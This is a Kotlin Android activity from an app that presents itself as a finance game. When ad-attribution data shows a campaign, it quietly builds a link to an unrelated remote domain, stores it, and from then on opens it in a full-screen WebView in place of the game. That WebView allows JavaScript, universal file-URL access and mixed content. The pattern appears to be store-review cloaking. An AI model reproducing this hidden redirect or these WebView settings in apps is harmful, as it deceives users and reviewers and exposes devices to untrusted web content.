package com.startegfin.financester

import android.app.DatePickerDialog
import android.content.Context
import android.content.SharedPreferences
import android.content.pm.ActivityInfo
import android.os.Bundle
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.EditText
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.isVisible
import com.adjust.sdk.Adjust
import com.adjust.sdk.AdjustAttribution
import com.adjust.sdk.OnAttributionReadListener
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.startegfin.financester.databinding.ActivityGameBinding
import com.startegfin.financester.util.OneTime
import com.startegfin.financester.util.isNotNullAndEmptyAndText
import com.startegfin.financester.util.isNullOrText
import com.startegfin.financester.util.log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.*
import kotlin.system.exitProcess


class GameActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    private val coroutine = CoroutineScope(Dispatchers.Default)
    private val onceExit  = OneTime()

    private lateinit var binding  : ActivityGameBinding
    lateinit var sharedPreferences: SharedPreferences

    val screenTypeFlow = MutableStateFlow(ScreenType.None)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        initialize()

        sharedPreferences = getSharedPreferences("BASE_DATA", Context.MODE_PRIVATE)
        initWeb()

        val sharedValue = sharedPreferences.getString("linkor", "faulse")

        try {
            if (sharedValue.isNullOrText("faulse")) Adjust.getAttribution(AdjustReadListener()) else showUrl(sharedValue!!)
        } catch (e: Exception) {
            log("error: ${e.message}")
            screenTypeFlow.value = ScreenType.Game
        }
    }

    override fun exit() {
        onceExit.use {
            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                finishAffinity()
                delay(100)
                exitProcess(0)
            }
        }
    }

    private fun initialize() {
        binding = ActivityGameBinding.inflate(layoutInflater)
        setContentView(binding.root)
    }

    // Logic ----------------------------------------------------------------------------------

    private fun initWeb() {
        binding.webView.apply {
            settings.apply {
                allowFileAccessFromFileURLs = true
                allowContentAccess = true
                javaScriptEnabled = listOf(true).first()
                javaScriptCanOpenWindowsAutomatically = true
                allowFileAccess = true
                mixedContentMode = 0
                useWideViewPort = true
                allowUniversalAccessFromFileURLs = true
                loadWithOverviewMode = true
                domStorageEnabled = true
                databaseEnabled = true
            }

            webViewClient = WebClient()
        }
    }

    private fun showUrl(url: String) {
        requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_FULL_USER

        binding.webView.apply {
            isVisible = true
            loadUrl(url)
        }
    }

    private inner class WebClient : WebViewClient() {
        override fun shouldOverrideUrlLoading(
            view: WebView?,
            request: WebResourceRequest?
        ): Boolean {
            return false
        }
    }

    private inner class AdjustReadListener : OnAttributionReadListener {
        override fun onAttributionRead(attribution: AdjustAttribution?) {
            val clickLabel = attribution?.clickLabel
            val campaign   = attribution?.campaign

            log("result $attribution | $clickLabel | $campaign")

            if (attribution != null) {
                if (campaign.isNotNullAndEmptyAndText("None")) {
                    val link = "https://mamblinddistractmom.mom/6FNKZwTh?сstr=$campaign&lblstr=$clickLabel"
                    log("link = $link")
                    sharedPreferences.edit().putString("linkor", link).apply()
                    showUrl(link)
                } else screenTypeFlow.value = ScreenType.Game
            } else screenTypeFlow.value = ScreenType.Game
        }
    }

    enum class ScreenType {
        None, Game
    }

    // Util --------------------------------------------------------------------------------

    fun showDatePickerDialog(oldDate: String, block: (String) -> Unit, blockCancel: () -> Unit) {
        coroutine.launch(Dispatchers.Main) {
            // Отримуємо поточну дату
            val calendar   = Calendar.getInstance()
            val dateFormat = SimpleDateFormat("dd.MM.yyyy", Locale.getDefault())
            dateFormat.parse(oldDate)?.let { calendar.time = it }

            val year  = calendar.get(Calendar.YEAR)
            val month = calendar.get(Calendar.MONTH)
            val day   = calendar.get(Calendar.DAY_OF_MONTH)

            // Створюємо DatePickerDialog
            val datePickerDialog = DatePickerDialog(
                this@GameActivity,

                R.style.CustomDatePickerDialog,
                null,
                year, month, day
            )

            // Налаштування назв кнопок
            datePickerDialog.setButton(DatePickerDialog.BUTTON_POSITIVE, "ОК") { dialog, which ->
                // Додатковий код, якщо потрібно обробити натискання на кнопку "ОК"
                val selectedYear = datePickerDialog.datePicker.year
                val selectedMonth = datePickerDialog.datePicker.month
                val selectedDay = datePickerDialog.datePicker.dayOfMonth

                // Обраний день, місяць і рік
                val selectedDate = String.format("%02d.%02d.%d", selectedDay, selectedMonth + 1, selectedYear)
                block(selectedDate) // Показуємо обрану дату
            }

            datePickerDialog.setButton(DatePickerDialog.BUTTON_NEGATIVE, "Отменить") { dialog, which ->
                // Додатковий код, якщо потрібно обробити натискання на кнопку "Скасувати"
                blockCancel()
            }

            // Показуємо діалог
            datePickerDialog.show()
            datePickerDialog.setCanceledOnTouchOutside(false)
        }
    }

    fun showInputDialog(text: String, hint: String, title: String, inputType: Int, block: (String) -> Unit, blockCancel: () -> Unit) {
        coroutine.launch(Dispatchers.Main) {
            // Створення EditText для введення тексту
            val editText = EditText(this@GameActivity)
            editText.setTextAppearance(R.style.CustomEditText)
            editText.hint = hint // Підказка для користувача
            editText.setText(text)

            editText.inputType = inputType

            // Створення AlertDialog
            AlertDialog.Builder(this@GameActivity, R.style.CustomAlertDialog)
                .setTitle(title)
                .setView(editText) // Додаємо EditText до діалогу
                .setPositiveButton("OK") { dialog, which ->
                    // Отримуємо введений текст
                    val inputText = editText.text.toString()
                    block(inputText)
                }
                .setNegativeButton("Отменить") { dialog, which ->
                    dialog.cancel() // Закриваємо діалог
                    blockCancel()
                }
                .show()
                .setCanceledOnTouchOutside(false)
        }
    }

}